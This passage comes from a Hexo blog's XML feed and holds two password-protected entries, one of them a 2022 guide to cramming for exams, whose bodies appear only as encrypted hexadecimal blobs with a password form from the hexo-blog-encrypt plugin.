fc0342dd5eddfff170bd0920fdf59d6dee9e4218d80b3b1f11956daa1b43f1fc7ce1cadb440660a927dcaca4977c51e72cc4d0d12b692278f86c2ea6ec5fc5d0eb096741c12a271e415ed6d3dbdef21add4672ed117805a7a17d2c5b7a31c67be1813f20758fb60b6cea99a8976c71c90673101424cd990453c508c2fc4766c02d6490517174ca3576fdb427fd95940a4a3b593c219db303b893b5d9252b7972f65e4177ef339b31fcc037fe16f66cd97b7c1d26b3efba12988186ef2d2c94e22dc8c9a38488fbe8031658e8f6d6324fc3d89752bee1ffff07af861643faa6b6e4e6d2edcccddfab739da667ccf953fbd5b911e4372d49e6a06143d3ff9fd885a445afc716d3d03c3e7d7f89b047645f2bd4b63f73360703691131a647d0df7e63e3f92b3fcd650fbef1412990e962e086f57f9d7aea5cfc785c1051a8fd02c76cd9118d751fa35ee25037ac688fc4d84613bf40d83be31c2c32dec68d873aefa040a61393013ec7cd7082d5108a6b2569fa01af3ddd590d7b92fc0289d58ef862469b7d2f6daf50cdead4d4e6e1b02af28b02675145a0920a4b3bc9b2c742090e8f9306c213d308867ac8ef4b78f0d1dc682e2be8a6203c26ddfde0140931c5d8b04de268816ed89e3ba99b5da57c71f8c8bc64d843111299724c5c19abe21c5e128fc8e6a4759b4ff281baf2e7fd864c2f293267ade85ce76d39f55afd2555e21e2c6ac7b21150cf48ca2c9f30532951a7fba62667289d7fe0a9026409387082be40ae1cff31a616c7ddad4adf48406ea2ad3c3b12f92025acb2bec703aa91ebcec37f39c3c227f1d3f04dd3a88b20d489e4fd28053386dcffaceb1abc1319c4af899307ee81abbb47498c1fd3d75e6a83b8bbea088b69701cdd6502a861fa02951753d0249921b215d81776f1bd8036c2d86733c05472290e7d2386b2f6f116cb226b3e54d2ae6ee74c0cf03e5ea565363c9fd4e771df66aad1061ba24d0291221999e372538fa95193348517a0ede10506dfc5f31bfa0ac3acefafbb2b8e664eee58d8757bf41ccdfda4abdb8db50fab8844c957c217bf465ddf8f82dc27c9b9bfedffa71e08edb385a69ba415df0a318dd9772cab0fa9f54aaba3d1035cef905885ae58d13cc6d6f0933b31b1cddbfd5f6a4c902d0526a69bfeac25212c7630e68b472329fd36be8128d4aabd1c25a5ceea5ff94cb80959887d0b3a2e97787e2d5cd5cf9ee3fd6ee9e770e9d553946de032d3136d26d37dfed3bf535090d50232200e1d042f4a9c0c7ac39796cf009a3dbc66dc012a0d0a3e985a5fe7c2d089b828665a3b6cafb0b31ae32176c5ebd96878e3ea7eb33dcf8b1f62a4fc79cafe2ec6c3601384276a30dabfabfb9418bbb72a36ec4addd5d4243e5ef5132c670b21a729788c21e121f39fa01cdaba0e9e4d7c75af52a34a2f98485bddb2ea36bc9a0ff481a0e999bfc7edf07d2854440475c639ab20aa33e32b08c9c53be94f4a5b9ff978477a9c119e2ddf79ea1d7008c1ac099772d05441149040962497473e82f8191c5e72d8782bb61ba01814ecf031a6aed21b39f837b4893cbd1be44e880738dae6a8ffbde915c7011086e2272e00b3ccfaf8bc593cadf294c017bccac425c35ba4238290818db7e7bb74afe5f70a0db1d819c2f7db0d571873520ffbe630a9b4429516aa6d8a2e562c417b9535a6ff276e1590279d140788da43abc1284623bc1f4594a61c97c8a8f742d3b923db61a737767adc72a035bd01f1bd37fb862dbd00dc0519132312bde63c2e4834739a08fd99278a06d1d07105588bcaade49d274bb573f236ee9a4d8805f81a56d8bc0fcff548e74a021fdae279e848a80a69a73e0861c98e9abf103ba7b8d3d74c0f7903aac5a46e59aa48e08a44e02a6773a09c83a920f05436a608cb99d7a560d6c4f5477b23e56c2255a7ba18db7a42a944b6ba35bf2d2c09a118e70c5927351feb3bb91761bdbad8b78021a4a5256a65ccfd933cd35defcfcd29ab06ae6a3aea923a70ed19310c1c1ae05789d363dbc797780ec5acf9acd2a4c263177b7378525e9c90cc583f18c7e26f58e434d87594c23f783da534400dfac8df4a4d46d815fb2e62e36b2318c2c0311bdf40f568b4ea130f360683966470fdf0bf5f0d3944b45ee0e5f91eb0a824efbfefded8cc199bb5c794d5706bebb4ed22ac4aa0b1daa6c116be7707335fc65d1e85fd80ae7d1c5570b0b4dcfcbb8cb221cb0e3fa907802e7a7b3b20d091fbfb41ea80116213ae8e0159ff230832fe99fe7bc21773ea04bb521a7e4994c91404e30a72b3cc004afbb33f3914c9bbc2415020853045d4a49113814d10f3bac59c637eb5eb6e48acc8bb4cd236676138e0a0af5b684b3516c2b21903bcf9c51be3fa0fa7771bd0e9e187464dd0dd224381e30752ab07b2454b000909fd05984d6c6cc104748f8bd582032685a3e3f1538aed58cbe0fd008b95a1e3e15ca7722fef7066a7a0dd62009db31de94d76f2ab2c198cb3916ccc480f9595481d97410ee2a1d06b1966d8cee7f84dec34fc415f597c3c58ce9f37646f4dcae6c63b42741d3619a6d3a65174a45b65b78afba45a0e7cef216035674989b1d01c7300d4e53fcc321bfa171fd76c8c6a7a1c9f050e1b54bc336099a0d17bfb5050db15d5000d904d91079441a0ab741a7081a8b72f96b87cb9feb72a5d30218ef411497a2f1d31897f368deccd7675b02894fe5a7f6e7f8783a5de21364860e076cd3e33de638ded42e5ad96e3c0b35feff3cba44e9e67b00b7b64e3d629fd256b6a1bc6d2e8555fc2d7c01ac2113ae72b921b95f2b8074e811ce7c52431ea0a07d4003004798caebc4c7afdf0aba883c22acc4ad332176f44ff575848cddfeaf5c120f43445b48047b99c71299ac4266df53ba6ff296099f0f6e543b43ef813b8bfe9e63c77f98c5eac776502671ba54ce7738afab2951385cdfc72703bca5659ac7f1e6895c99ce278e9a4f97e09b100dbf36bd4822dc4a58f9b4077c8280a1d303a9777dadf047c35ce617460a12a63006fc3e38cc16d0837df602705a12ac4dd5def583b80bf505b18007f400a1878e95bbef84b4f10159ffd079548e4b0759e8a11ce943f2b4d7f12bf50727374e3f401c074c7400ac2d1b06bcc839903a7141bcaf63bbaeed9eb1247fd0dc666d7b3901e6ff38c745efd2ff4d652eda050b4c829a4a7432c463051a49d80d75d6bae1f6f88a01c291c404f1c531abaa7f7fab6cf132ac01fa0ca8aa80ff149d078fd5a267d311d9c2432c0eb6807d6e7ffbfe14a0e93b81d13a3355da552c9845cd38cdd8bb611ac4a27f1239f1c549d49149a820dfeea8645a7123158cf8a6ba2ef76cda16d2e28bc2c4fd87542c822390e129cfedea171e81c593790060fc409b13fe00170889b09302c1edab9f51b80950930d449614e7f8fb10237f5c70ea7a7477810b361d146e1bee69581365142f1e009368f80ed42064f7e055827e1699d7931bd09641a3dc9d663a82c8e9d6ad59460bddd65142e75f734d2fc307d12675bb604eb6358a8cbb3ab0ea03b331f8bf12cdc3105c81ee0c3a95aa94136b2bc1b5b992c6693d093cabcc16bbdb7dc3fb6f5c6f1cf8fd911af9ffb252380e047c16b26a7ef18740c41e9ac97c5874bc8fa46f2530ffa4f08e290cafddc3daedb299250f99d6db6737e01ce8cced4fda35ca17f3e0c35af39b2cdb09b8b4403976c80500a0e06e610792649490411b83fe0951941882e150cba5556a32ed5fde6f17614661506aeb218ef97a4736fedd1d5bcb35442982e9351fa23eef1e9239faa4dc6145fc6fab75af2d30609e0fa8ba1f7eb33fea67187b3f7c669830f471e016940607e4e47a23d34363096921919fdc0d7e8fcb7fe8381ff2d2407d8d24bfe75e63f271a1e72778fe2a79c1f5a52863a748f6ec4eb18bb16a341c8302835772c608e6bcc558b04de8ff454b3bef7ab375a7725861710962b1ee19600ecb5116fa1bf87958de3cc148878141b3c0c83b6e34eec7789d29f985ad0632c02ce11ca2f6ba7ca3635e5815639541790a41c12872428e72020bfe351a384fe9796c22b9130ed68b7307af3a307e59140c5b82aa6a6db29f42fb7be93085ac816b75c747feaf0140b9ff6b2cdf967276ec767060d7bd281035714ae7214f9cbf964a603ac4a487de8aeb0b8448a0c5bcbed6bbbd193169c1912a0a3c74ff646c0c87a522bad1549a118a1ff81bb597dfe409b1d2bd09be52a07b021c18a85fe0934c7e35adeb6c49912db5a1d684c5141de9998eb63a4e0aa908563eda255622c7cb3034499799eb0061ee75426e75043d14d5587d05dde66ac42c8a975bbe4cda42a0bdf30dfcf28acf173386eedbc71e96054edf085a932ed76fa8b50c0cbbb8d5a60a37a2b3b9d9de7f90a1ef18a32e9433a30ab7b1960ade524dc97c8e9d11de8314d20004141e9a8945729964b5fc23dc5da30cdd98a66cc4ecbe40cea3579f8be345857247218ed7a587eeb3da78751d0aba2588bbed4a121a41ad8a2b782fd15fafe72fd674c14901fe5b130f3a3db0b088b463bd5b5b41fd2ebfaf6e0f78a26177f801f334da478e79b5187b97eac9590b52804d1c16e613a109c02ff42c43b9549b8f9673f6ad693d342bee9541e5d4d37762d1912b459df282ba318b5f413c791f5705382125b98875ae5d102ee5840a369899595075687a7619996af93460e966b4b7807557c9044c2d55206f3a3a3812358cbfb898e75bc8307f168a27ef26efcf52410f59b7b8fa996f67672873831f8e2c389daf27f92cc1a885839c42a6d8d2991b0eef2f14b3991bc676c8f58c3790a611dac25b01eee2d5b1e17cd5f7741580a88858ff9a54fe02d44d586c2d4ab318f359bc655ae989ce0b1226d2abaa246694bfbcb141f51800de12e09d16f14419074a9e2e814560f85237cb03da08168f58b04620903e0ae3f9d4773cad615ff57c99112898aae6c0f77635aebf8ca161095cbafbd06ddb5fdaea248cbb6aad2184a1c0cbfe3685fc0390a1d5393adf698b3bdc9d2a8c9fa900c7458cee0c2488ec0c9fb8989c0cd476f30cd251c431bd959ab5f97016182fa3ed42008b3a0edb8c94ad0424703c4655f3bc7fff62182be496c9dc88f1038135ec12dc3033fa910f66f3ccd64e31c797a98b6a42c01b080906b607eecbd24e3696a1460f1ed934738fb91d08f41ac7a430071b375535b8f1067c1d45cfc4c630fa9dfb5c974764f50ab96cb0de17461e2112632d62be89d1b5874b4d576e4668fbbde010333cfc92b923a134d00b5a47226496576ab70dcfc86e22d679c2277e24e031ccbeb79f012c056595c8613a30a72c2ec05d203d7b8d614c31d99219617ae5df1bfbcfaa4255127d40d3c77c74303eaf475fcafcdd8278ad4f18b28e1172f58a51629ea6b260a3fc851517f7aa9725c4a7da7a373306566b779a01ba6886c7b2d7d1b033429ed222cf2e498c4f92245b561ff1a0b8aedfbbb35e5ca90af5c1efebf536b95c898648389ee0ee4e31c5d143efc83b9bd4533aa18192bdbf13e3afed1c7752cefa6fd427d2f52667f08e83f78fc099609289551d7bc93c19571c525b52cdedc31bbe2c4c0c7a0dcd2f77ec729979011d05391c7e71b577e0a11ff273d8339aaa8e0d42f8ab8c80efd6d3e8cefd0a254409aef14ecb83fd36dc2504c2965f7d8c92b9b3ba6abee3d9c1434562489cf6b43e50a6e20654988e085e763cae5f115d476784b2a6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-flip">      <input class="hbe hbe-input-field hbe-input-field-flip" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-flip" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-flip" data-content="Hey, password is required here.">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 有感 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>突击备考全面指南</title>
      <link href="/2022/01/24/tu-ji-bei-kao-quan-mian-zhi-nan/"/>
      <url>/2022/01/24/tu-ji-bei-kao-quan-mian-zhi-nan/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码认证失败，请检查权限" data-whm="密码验证失败，请检查散列">  <script id="hbeData" type="hbeData" data-hmacdigest="e4af0bc2c7e82b706795721d083423d6ac5bb83b4b95f863d82ca4130dcb6628">fcc3ee2b5475e231a98c514431cf96311dbcd565428f4303921f93f815436577dbdf99e3cd93db9f7780812fd02ac0bbfc612afc110ccb5aade8a8b35d4eb274c414fd6247dfbba061230e7c4a0b36d01a64795a1af068a464ef92af25e0f82a58b9036b1e0f284464d757b171c868ef40ea8ab17e1c00c61c0e2f8e2ab986c5902601f41ff3bffba9b9e239ed2338ac56786ee15e86550b14fc42c8ea4d448175a56acbda821dc04b7fd39aa2ef20ab2052c74782cc5a6450fcbf99644bbacac038663296f7f4e5c48f9788e5c00c67aefaf64a0516b2f3b3a520f776da997370f427aa2470877df5238510c1b8834b24b69e145c9295ec255a30bfcafefc49e59c50a67222a2ad1f99ca5da43294b6fc849552118ee20dd1e47ad6577ca328b1b1e7299ae5f15121b92b0229d3692a13ee4aca66f49136b5a3c7f5308e51a1a75b5baa8db4a973c3ffb3b38160d780fd6256310d38851eb108d3c20549a543f70ce3edf7f964d0e72accde9373803a7f61d94d7e5ec32890d053ccb0cd11915b6628b560cb29d841119f1455dad179def6efd4a07416f133bfb3114ce10737c85e0f54543c4be5d677bb96881f96982021908fbf573f49d2c61281543bb71b859c0e2b1299e22effe5f5e2fe7bddaa73fe860bb0c2cf6405e234c0b5b3aef1fcb67cab02d60e26229d5781aed3aa94658ea1f37fa49d87e5f8163bbbe7719046e4311ee5423d6b85ea611be67fd3a86e482f164725ac8be916dee27e785142add6674bb130c511fd0a99e0e6c86c31dc15b6685d84e70907524c570968603103a2109183e80a8d1323ea86f77b4ba5f9f326f8fd1c95cb56d9c2e6ef3d0216bde84dc498fbf8173c2d83d7cdea678c7771f020073a60751374978a166f1af9c0251bdffed05372bc81feaa9f8d33202ccdaaa64fea8d7f1b2702d9fc9192c08ba00dd307884297e69035454b532ba35a691bfec84a7c86c78512f2ffb31ca9e2fed0a7d43a6e3df8dc8f2c912eaa418668527126416497100c94d3e0f57a476b0318490f641c9c3fc17bb794c9f2b32ae9b1d51a506fde0be224ac3d3fef1a372ed1f030cfe0bb77f008853a44a6f8cc4bf0ceb1e42a385998bb461d9df951f4d9d5d3a6ba449341c5301cbd1a76f5502a7efdfd95ea9c07da79f1c7fa7e11cbe2a33584dcbea4d76d4e136edb14e867e059456c1d2cd4fb1ee494da12025ab3ef80368b2102959eba1b8353f305b3205d44af43198f00862174bdee33bf0c509aed0713c7461a738374b8537d59b6a7442725f94c4e3db0fad55dc6bf3c59540be741065ae7a90a5e9067701cc64a911ca64bed3bef700830cf697b39f7f90a6e05e6c53bcc781faaa564e77d0f217480bce956b020057faad7bd0a228aede34ccbeee36b1d3f6071cff900869710d88315ae7bd74bf18c2333809a52d17fb8ca11874c3d2902395e71a963722e33a885d031de5d6515c8b24801c7ef242a209ed88e8428750bfbb6280bf8b60c29fac44d05b1f92587fd64f9f9eb4e74eba9f9a3375b9ad3bd3d20b3ef27ff11b67d93623da64c7f3e082a9c139cbd480b4bcc2390746b52dfe9aefbdd6a153cfa00989b8410d97cd7750e99e416855060242dbc91a72609bb7fd21e11defa0adef1844f8b50b65f66f6e681c8bfced239c054ab1ab934b64e4e07c751669ae1aaa5422fe72ca282b889651935400927ed974ea463ab90f05d356bde264196f5b159432e7eece7bbbb33b96c1125f2ae918dc313e38b8a22f8e0d3b3d335efddf962375f7b5ab5caa4ba856af93ccaf9d8329c07204c35e48f2cc11863fc1c89efa6c7db3266f2b571f572e4065551456ac37ac6b4c4263ae9eba75bea8e013104a9f3afa64be8d0fb0fe0e1a029b0a27f89a54d2f956e1ed151f2ebbcfb3802f439e6bfec496832213f448b7ec614901d72218145b5f88adb00f5890ca015fc0d9927d76731e01ed2f46dcc45a0cd9a3e24b1aeac920cae69f1471643f1edf3a95b9954d8d301f003bd6a92d13a435006976f500a34f23d5d9703dbfc7345f71d919bd30ee3ad2c7c8e4bbc5060192a6f37fb76b5b28a13622f4bce8cafc5c858a12a719d473e48e798267688306865cea07f00f710abc941a4cf46e83a19fb3d29f15db39202729d40fb498d53981e0c16b787484eb0c16adba3fc1756f256ace1a00313d01b8bbe39aabaf274759485b2ac659f3c8f1055a1b0f59d2d6a547dcd45d533a81550a8e0d7735cf779030e41bbb897f20db14b89f6445f7e6f58b1c9e22244c7a865de23942d3b6d1c95f81a78d16e51c11c33d8132b43a2ac5a75d13322f9f3116ebb2ef28feacd3c83739d0e8e7d1834c1d985f92f3aa9a6ef5a52a4b7296e35084bf7985ee101ffaf5a9902b4304ec2262c302de39204d0d8f3c4d8cfc5aa1aeeb7c4c6ebd3105775c26fe8a66b7812db293e24b38f7c006eb37b9707c6a39bfba44c3857ac6f13b781555ebf0dfcd1ab814dbbb7d4b6fab0c16089bad0c4869aedb38b5310ebc0fd2f0a82d09147e9736c397b1385c53d1075ecea924763299d37d82a0ec612ade1aa24f58a54eed73609d878ca97e90d3158e72f2f908ac40a6a67d57b5c0796cabccc381b5830f8f5ddbc7bd2351b9958aad6e8dc57b18faa5d6deebf350043f08d8366f6c6b050e12202995165029f2c900b6e1fc561e8f2eccbb1149f999604d9d3504daf02cbfaa99ed62217311d0a5346f96a54eb0127385a55b9ebf4d1108e3c8437aba896d4544c143f338a6ca0aac296ee6523fe3a531ec7a83bf49a67d62b2cd79b915d204b39d7dc9e360c722ca522c383662fd89259f34730ada49af71f6881169f5c947b2b521ca32b36b71c1815f6e91c5aabb4377c64d16e1dafe7b25731573595525b02e67baa7f8acd66d116909156aef3fb96ea08f28dc3e662b36c253db9412c8f51003c8ee900344533b700269afedc3e5a06d4fc247b651207b97d3045abe21d032da25196af8b323ca54db1fb6e433486eb696035b482cb14d194bdfc4de589f006d8ca696567a59c747af652da59238ef394144e25d979880efa34c1879b6fa6d038cba721c33e086fb741c5ba56cda9a35340060a94a890620b63a77a32ac8b330cfaad15c5ae852b4e0028cb20a4edeabedd8cb03384d2b7cbd6fb32905878ca77545ee284b9356d9bbf7c71f15d34c55ea57afd405180250d4cd2ec2b21c938ffc21031c95cd3add4bdbeaec26835656a7cf79729ec4801d16b597feba892b760ba780d6775aadd1ac284d44cdb181d12439896dc6b91bed0c808ee22136ad5cc952307c7313758fc621e3a40d9bbc3dcdcc69a26cb387f6671dded8c0e250ff1cc9133860b80fe1c74b7f5e0b84c73cb42fd69e654882e5cf95927bafa86029d73cd8c6da36dc01f23837e52ff5360bc476fff88fbf5397362a43c57fe5762cc6edfd0bcec6ed993a57dbca00c7c5ca6da0813f9dcae9ce2b460753914f3c0b867308637d8b631b481c8a40729f182d54e4e3146766e10e484cbb01e018e1ef00058617de1b676c3985e3b5f300962baebc077c4cb498d61bef5eea0efb127ceae115c3e66012d0f3fdc80624725da352ed61ca4e241363c30509af41e75500c25113531b95aab86076ed045251316308018879d4142164ff7b84629a158d9ef826717a7030e806e368fa61de9996a65a111f397dc4d937d4452b895bb2fb7d9106c3e2cd4f2a8a361e9a2991da217000f6b0ab751da6e7bf96e03757bc2c3a88bd9f5a6e5ad1f00ebf65fe34cdfeabf0fc29b94b834d77255e0f1c81206522b2b8bedb02a610de13b71a26e3656bbebd1ac93594f7de93c4baf1dec4c62df01ebd187d6da4f45f3df13f3e37359bd6dbd7dd0aed8589f11c81d369c336a3fdf9886523b981d36c942a0799fea749e9859e5be2f7105f7eeb34ed06bdd853ea0a4fa7a18ee8ac60bf2bfce50d768801f366920c816ff430fda374f1bcb4894c239bf053ef111b6f1ef7c24aaed044a5afd3af99ae11292a1393fe8c874a9a716033cc62f05faf4853a8c423e413366dd301b07a115b7f6e37b2beac4ce797385c4bb219dbcd44e9417da6ac40a8620ceb176dc336a4abe8fca12909088e052569e6688d313670f6bdbcec1b4bb05f57080a7a49ffb4cd9b4b9a72f8dd694dc64befd26bd4f52cc490e337b2f5ee197c3477604928a2e3a67b26cc119261258f9616185c492a62c9ef364cdfad54c76c9c4bb939450a6a031561713a6240f133eca414679c21383fbac159187642f9d7bfe70390d33c5610c1b3a4b762a03d4a10540ecddbc3876f73e946abdfad8860c7968568ff10a82d2f5a06ab0c66d8a1fac09c77ed777ed62ae90ace253bb2b8b54da7c59a1c0398b9e2a0df03e93dafbab613c52d4b6116abebcf92467ca7e4862668a90172d3df9910dbc57b050bb8dae2a3d4dfae60e864eb1cc9c6fc6912462c9c9fb4eede41937cf1d6dd33a67099b1d2c8d92d22acc764caa7fffd04397391d281ff944ca04f500c797e56321d174ca01efd2a4c9f6015eb838ab401d0ac019ab0ac813481b0ab0b9f32b37e0f2fe882185cf0842719b159854c7a91ec06bdfaff253fbe520b21cb0a60078bd9e37c37f67a1669e0f3962399779cc360f50161a2ede677b23815f0d78c5ddcb1cdc89646c6580830cb8c611597d980243ee8ca49013c5e55872409a8bf917671d6497c6fbbab4b72d8d90bad9ce815819542bdc7f10c360ed5e67b2e2ff0342bc340f14f629270867ab5823a1f8680a25a3c9bcbcd2b3536197f3b74de9aeb4ada6b2961c326b1925e661ba550e54df5d4834c28b3cc449c32670daeed6ffc65e2d967342c5f1d6e241e10027a431b3260af69290ac23f955f13518cacca083daf5189cfb2bef51c7741e80effe886295a7a74939b3299429f29dedc84477c7f6de64120e50e44dfa84b0c305e948882a01bb149e13b71ed424157253417b311031692c60f06b6c440277f07d965ca2590a98176ccad353f0ea32eaa0a2eab8b7c57f9f45a35caafe430a00135e2a4f88dad2f15e6907d956c28933fc6059ca546d44788a35fc8f1a028fe6b3946cb0b3ac26d00b85e5f7ba645fdf9c03fb13c0aee318ff27123b21ba45c54e5315e080438e4bc39ed57ee72b7c5fc4a0e528ed81b6f99f2c8d822be88f0509341a5c6c1e73c50c3d1511fa46697c30fb0a83a61267f9767e4fd338439e357a438044239db3e0d8f3f1c84749a347514dd123afb7f36a63bc75c241234e93ef65be934cc1840de2c3189c71b810d198b26031b14bf5a88e530415c9632f0e859441b78341df816a07e71bf37e4e674337c71c3a300a67e3da3def958c41f7e9fd3bcdfb554934f310d162a00685e7aa23658336d0a5f5d2754569f553af82f105df580422f914dbb8ff16ba53f446933414f2b196f7bb4d72406434a72fa2ab55035ed39e71da30dde48409ffed98db8c67e279ffc93710ef900fbce29a5a89ced81bd2436e6f73f47e54cb836789aa9ec261fb4ec5c22e2d90ce662d4e5013c89e686e3318be52f62d0b5c432f3ef9c1b02b069da850e35260c90a4db9c9bb34052fe8cb309142b4a20cf551557f0e57197322b3b281e5897fee832e6d03d373ce85049215d51c587821fa0ba541b1d7b3dbef4c736238f2144f5202a1632a97c17ebad1e7dce9703cb57ab182ba01ffb525e23d4bd66a025795758d6e5aa9316b734d4180e2d1665e243a7be50d7e12311a3f7138693b4c7cf2b85d4b2408bc6aaf7648b110c1ab60014b8665526089baa90e04bfdf2bb1c66ff3cd4c094c21bb76478defd63274686f74d74047b5d01adb8623f989a60ad971504083a1ee81d8bfd1bfc26faa73e4e5de3933981860b16fb675445db29644ced5ce51772d3fae75e2a4fa41edeb4a19a1868eb63c5f0ca3efaef3aeffee0ebe5ee6e565fd4163abc3a1c2bc227f5fbc60a00a9be7daf412e0aa3a115b350cfcb03be60ad711577f378dd1922b71267fdb256e3a27c16140a0c3198f076f0c59a9c0a69bdf2b2460279f4be0432d720a01e513b8a9303cc28861ac46d821fc8cd63d2deec43fc689428fc9f8450fdfcf7668c3cf3945579b92865817f7102770b2c20870284f5992713ba79338bbb3956b0d6f4c9c6820db42d013295c187b3d9444e37d13f544bcdc72e5ac6851e820a609d4ffb0776cb43576d928f04ce923f58ed264ab96b0ead1911372aaa77d8703717384f7466632d0ca440f731ba930f1e0e855e6399aa79612db2790501d1acf22fcc05e53f140786283b2560c2be4eb07faba807363a48ef8a4c86267f1bc00e6b7121eb24a03930bce5a456df68ec69bd3801eb9958fabac9184808b74b8d1791c3296c7af409b81205baf6a1d90391b1ccb7908950028e6a215dfa39e79099c204448c7d9fb100731ec79daeb28a6212b1778351d73b979a52105d15ba48333aa9eb30129e7ef16aa48a4bc45e1b2b9bd426d2f60f3d99a48f8fafe4b54168410daf85bec6f57cb61636283db85c0239cb0b4d2496c240740e9cfef07fe1075c0ab440d1c1a8b979b3ba57905525a8c9d54b021e5fb01f1821b787948bbbde6547816376e51c85cf5e11d92c27fe62a742f31e3dce9750a788f17911defe996ac878e948b5899e1e81411844479031a29bd14053e4745021a860aea1fe8c5c0fedc7bb9ace00902600a0fdfe908ccc00b14d14cedcefa54d04904f5e455f6732e7cff9fa0c0ebe6a6c4e4ea84c7cf6a8d5de1910d578fa197e3c87680eff7ae0635057b9d4ca269519c6227b1a2958e21d1460a0c9f4fd66ec77b4dfc932415bd1e3c21ec3c6115f2af967db11e040e6c049d209618c7c1a76631ea35a3c536eda7b498c3bcbbe824acf47a3fd352d23329504cf378a71b667fc970837f11f2cf198103165dac7fa0587cd725734ec803b7adf6c8f406c664892e5d5f292fe7ce03535eb96a3d0db2c624f75353c7035bad028acb3d96a044ed7dfdaab3288808be8e9b88c9a0d9fdbdc720a5a5820301efef29ee8eec2981bb40bc16dac0792a6b9b377c1c98b58f8b8fb0b99382750ac76ff41220b426222ad8eb3a3d767683c92000592005b825b0f397559eb69941e6ae6613ee406a069f8f7ea02f0012a583b30f69d746e22a162c0578485699b6d60e608e1904e6224e1fac0e8ec5d3693e8fa878e5ae6e5ed559b9f9ccac9bd4bda60aae9f637efaed7c47659962bd7fa47fb266d87b94c62e3a88d1ae8ab1ba3f170beed1a82f38884350b2808cb0933f4d87e3a9b4ceeb65ce506c7bc4d65c4f2eb69d5511219e17651a29952433085639a2f47ea46aabe71698878e16edf8945eaa5509c1fb7f1bf0344309661cd61e0edae94033566941ef5d42ffc73ac54377521181ac41c4468b4f07dde2ff4eba6170dcf9a8b8595e9eae982a66ce8abb8f2fa431193eb79419b2ecf24a06fec43cdbbf5e6981a9fd136652c52826d84850366abe680a8fd95ccb29537954cf594b88abb219673f8b1388cd84a0cd284512ee183414a3e025568e6ba4fc00365b9d1e4a8b7baa175f329cd2c84296d6251fdf6868f5d8803d6814b94aee498d3294c6407970a33379f80cc87a212444a123aaef2c6388dca90a915df18d4a316d09cc13a002b948723764ce117f246794512c548c05b2efb05b9e839bb1b7884a1f4af3ce74c9d796e6a9958031da22240ee1f969ef91d8521c8cba3656b4b1719729c09b9d054ff6bfd2e97d30b84914f1b90b2672b89d196bb8cc51587a14ed980ab3d3cd19b03b22a390efce374b5b5fe86c56680e5d7572dc33199b538fa92f1dcd6914a4a8b80e7ded07dbd3aff377fbf6f1f2d46f2ccabeaa73cec501326ab296ad40f1f2d540387b1b34e09cd2266cb8b30aea6db808b22f2295ceff212d7f49b53c2d172370f9d499b409d8addd856a93de94f97109208f6f62d7cef651990bf606ef67bcc3c312940aacd912ee1d23899e00a5cd3bed5228a3c048d37bfbe56ccfa0ae115e1abfafc2a93cb7b7f78421d4e4f063c88fa2f8b86b49cc2f0bd2d153625c9b89e5b1a11fb0fc5a0bbae97f314fa3ec8dc70be598585f0f22183dc9df3b312d37a9a66f27a565761570c18c59c3d2411a8fe09e3d59b0f7a095acc699020b3d11de345dc287062b684af33ccbabdba5f44182023ed15484da4df970466bb4a69e94b2af6449af80beca633ee7b58e678fdb76f6c2e35e784c9e967dcdc9998af777b9e4dea8d0a3db613408263bc2eea772a37d11dc23600a3f9a333e073189a41cce261f92fd95c68c45b39887e521a8db96c23737f6b31ddbc611feab4f60b1d4b7808f2f7fe0677fe0db13c6ae39c35fc3bf9ff14853a281b2a8e4161771f694a7a761e97db6bd7f64851e33dfba0222539551546a2fca738767c0ba8cfb890bb98cfae25ee760fa4d20e98d48e70f8c0cf06010d762ed87f57deb6e89668a20fbba450f806f61ebff7f735f2f4626079e0795fc15884c3fc9065698f8bdd1a8a00f8fc638031f9e0012dd9dcbaa8ff6c7676a9938e45ace7b96dfa3eb833986e2330412083318090e0f5b51ff6162a332bcd1ce81444359ac4be036c8f13868bbeb7c02fcd39ae0b916ec666b69e6d0a6080be516881e5e064c82d17aae0396a44dfc8cf268b3c44e7848ffaf752911362cdb4c747769398c0fb45b4a19828ba245275279251973f7ca15ad02f6d124efd780273a5ab1e04910b555d551a1769279d4a88bf1cbd5db0c6ce899909ea537230d960f6044875499677efa7bffaa8c43aa32b541c16c94b453de23508499aada63089b8b071a1e00e1bbee155eae6265061d8dc84c53a2c5edc0fbe53b6deda68b8efc4b8c9adc23a37e8ebff38909833975844ac5dd51cc037f82c2c16310d4ef9af0598a267fa3b5b4ee3a89b12f922a878b8717f1ca988307b887b72e9e288a6e6ed06a6fa72a0940448b1616bd8d3aa4e3646c5e0baf44e762c28688a9538e3f7ef3baa2f9215ca67beca7a9cc1cce15e8687f45eaf19606b0899c1347323a7058a3be39d56e248b5152ddee0433e9c7cac38c1f717252a6ce73d3ae6006887c067ecbaa2c906c59694f2154b8080cc532425ce194c0ca6847d908655e4f9fe6d8fc656c803086f976175b0c1c31eb3fc147ad84dc4ac571e436a133de553c719a50bcde591b28eb6b1a17cb120d9ab8ed4b34908418c02902a5d0aba748e5ad6fc8976da8ec25a34a3084cddf9902d792c8c4769fda9bd4d86380c8beb319f146cee1e296e35163b9dc179c0fbff94000c5c022b8e5def2dd1886fe3801c3766901629e4389a52452e271971d6fc4aa20a361ddd614759bb49760f61415ef95c4876442b707dbaed2a1fe3c629278dd215392abf61629a380cb371e1eb08a22420a5ea3cbb8121736edd38303e119e9679238dd9eb6a3b7e0e678a2dae32c4dd6121336ccf6bcae09c04feffd3e34d51d13e82fef76958f94ed6e7a96f295dcdf661097b67c7459cffdbfe61cdfd663916a9aafb98421d2f054d15917b8ad0376989b4217ab6e6520560c97d1fca6e76ab1fdd90307d7820de88286fc9a974d10498260c66b7a0de62cbfefd35fc7b52e5106cddc8e39f37be9e32b9a58b78f333d59d5848d0be0edad26855f3f460a02437f0c8aadfd27ef1894fea764ee3ef17d39a16341aae191eee3d7d846c31644f3bde59dd999a131fd447188c103bacd96540d9b30461c9f78042c4e1b4fd00da404a8931b7baa36a0f5e3fbf0cdfc4c6a15091981188c95f5f48c3e26e84cdd234054ad6d96a924fcaf010b6a42cb6550670fb813ab4edc0625df409accd07aa6f264c553b143fa93c356502504845c1